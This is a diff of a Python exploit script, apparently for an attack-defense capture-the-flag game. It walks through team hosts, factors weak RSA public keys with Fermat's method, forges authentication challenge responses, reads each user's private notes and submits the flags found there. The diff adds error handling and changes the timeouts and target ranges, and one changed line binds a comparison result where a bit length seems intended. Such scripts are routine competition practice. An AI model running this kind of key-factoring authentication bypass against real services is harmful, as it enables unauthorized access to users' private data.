@@ -37,7 +37,7 @@ def submit_flags(flags: list[str], addr: str, port: int):
     except Exception as e:
         print(f'Error while sending flags: {e}')
 
-@timeout(seconds=5)
+@timeout(seconds=6)
 def fermat_factor(n):
     a = math.isqrt(n)
     if a*a < n:
@@ -59,7 +59,6 @@ def get_user_ids(addr: str):
         return [el['id'] for el in res['users'] if 'id' in el]
     raise KeyError
 
-
 def run_exploit(client_id):
     base_url = f'http://10.67.{client_id}.1:41203'
     print(f'[+] Running on: {base_url}')
@@ -69,22 +68,26 @@ def run_exploit(client_id):
     for uid in user_ids:
         try:
             user = requests.get(f'{base_url}/user/{uid}').json()
-            if not 'pubkey' in user: continue
+            if not user or not len(user) or 'pubkey' not in user: 
+                raise Exception('malformed user response')
 
             pk = user['pubkey']
             e,n = pk['e'],pk['n']
-            if n.bit_length() > 4096: 
-                raise Exception(f'large n={n}!')
+            if nb := n.bit_length() > 4096: 
+                raise Exception(f'N size too large: {nb}')
 
             challenge = requests.get(f'{base_url}/get_auth_challenge', json={
                 'user_id': uid, 
                 'pubkey': pk
             }).json()
+            if 'challenge_value' not in challenge:
+                raise Exception('malformed challenge')
+            
             msg_hex = challenge['challenge_value']
             msg = int.from_bytes(bytes.fromhex(msg_hex))
 
             try: p,q = fermat_factor(n)
-            except TimeoutError: continue
+            except TimeoutError: raise Exception('factor timeout')
 
             tot = math.lcm(p-1, q-1)
             challenge['challenge_response'] = pow(msg, pow(e, -1, tot), n)
@@ -93,7 +96,7 @@ def run_exploit(client_id):
                 'user_id': uid,
                 'challenge': challenge,
             }).json()
-            if all_notes and 'notes' in all_notes:
+            if all_notes and len(all_notes) and 'notes' in all_notes:
                 for note in all_notes['notes']:
                     if 'content' in note:
                         if f := extract_flag(note['content']):
@@ -106,7 +109,7 @@ def run_exploit(client_id):
 if __name__ == '__main__':
     NUM_THREADS = 4
 
-    all_ids = range(22)
+    all_ids = range(2, 22)
     exclude = [3,4,5,11,14,13,22]
     ids = list(set(all_ids) - set(exclude))
 
